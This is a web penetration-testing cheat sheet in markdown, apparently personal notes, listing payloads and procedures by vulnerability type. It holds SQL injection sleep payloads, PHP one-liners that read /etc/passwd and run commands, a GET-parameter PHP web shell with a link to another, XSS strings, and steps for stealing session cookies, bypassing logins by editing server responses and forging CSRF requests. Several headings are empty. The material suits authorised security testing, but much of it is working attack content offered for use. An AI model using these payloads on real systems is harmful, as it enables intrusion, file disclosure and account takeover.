## Time Based Blind SQL Injection:
```
'(select * from (select(sleep(10)))a)
,(select*from(select(sleep(15)))a)
';WAITFOR DELAY '0:0:30'--
```
## Error Based SQL Injection:

## Boolean Based Blind SQL Injection:
```
'2 OR 1=1
'2 AND 1=1
```
## Local File Inclusion (LFI):
```


```
## Remote Code Execution (RCE):
```
<?php system("cat /etc/passwd");?>
<?php system("id");?>
<?php echo phpinfo(); ?>
<?php include 'C:\Windows\System32\drivers\etc\hosts';?>
```
## Malicious File Upload (Shell Execution):
```
<?php system($_GET['cmd']); ?>

https://github.com/hackerhijeck/For_Me/blob/main/Web_Shell.php
```
## Application is Vulnerable to Reverse Web shell (Shell Execution):
```

```
## File Upload Bypass:
```
https://book.hacktricks.xyz/pentesting-web/file-upload
```
## Session Hijacking:
```
Step1: Using xss hunter payload, execute the payload in logged in user account.
Step2: After got the cookies in the XSS Hunter.
Step3: Copy the cookies and before login paste and change into the cookies and refresh it.
```
## Session Fixation in The Application:
```
Step1: Before login, Check the cookie or session token.
Step2: Then After login, Check the cookie or session token, If same token or cookies is there.
```
## URL Redirection in the application:
##### Endpoint Pattern:
```
/?url=
/?redirect_url:
/?checkout_url=
/?login_url=
/?redirect_uri=
```
## Reflected Cross Site Scripting Attack:
```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
javascript:alert(1)//
"onmouseover=alert(1);
<x onclick=alert(1)>click!
```
## HTML Injection
```
<h1>HTML_Injection</h1>
<marquee>HTML_Injection</marquee>
```
## Link Injection:
```
<a href="https://www.intelliroot.com">ClickMe</a>
```
## Iframe Injection:
```
<iframe src="https://www.intelliroot.com"></iframe>
```
## Blind Cross Site Scripting Attack:
```
XSS Hunter payload
```
## Admin/User Login Authentication Bypass Using Success Response:
#### Process 1:
```
Step1: Login panel capture the request and Do intercept and click to respnse to this request and then forward the request
Step2: If Response code 404 Forbidon then change to 200 OK. and then forward the request.
```
#### Process 2:
```
Step1: In login panel first logged in a valid user and capture the request and "Do intercept" and click to "response to 
        this request" and then forward the request.
Step2: Copy the 200 OK reponse data and save it any txt format.
Step3: Now try to unathorized user, in login panel capture the request and "Do intercept" and click to "response to 
        this request" and then forward the request.
Step4: In Response data, paste the data which copied from a valid user, and then forward the request.
```
## Cross Site Request Forgery (CSRF):
```
Step1: Capture any POST data and click generate CSRF poc, save it into the html file.
Step2: Change the POST data to anything you want.
Step3: Now open into the browser and click submit.
```
### Test CGI script exposes environment variables
### Account Takeover through forget password
### Improper File Content Validation in the Application
### No Session Termination After Password Change:
```
Step1: Login as a user, After logged in capture a request of any functionality and get into the Repeater and send to Response.
Step2: Wait minimum 40,50 minutes, Do not loggout the account.
Step3: After complete the time, then again click send to the reponse in the Burpsuite.
Step4: If its working properly, then it No Session Termination Vulnerability.
```
### Password History Check is not Implemented
### Concurrent Logins with the Same Username in admin/user account
### Trace method Enabled
### Full path disclosure
### Improper Input Validation in the Application:
```
<script>alert(1)</script>
<h1>Test</h1>
```
### Client side validation bypass of email and phone number verification
### Application is Vulnerable to Clickjacking Attacks
### OpenSSL Version disclose in the application
### Last Login Time Not Implemented in the Application
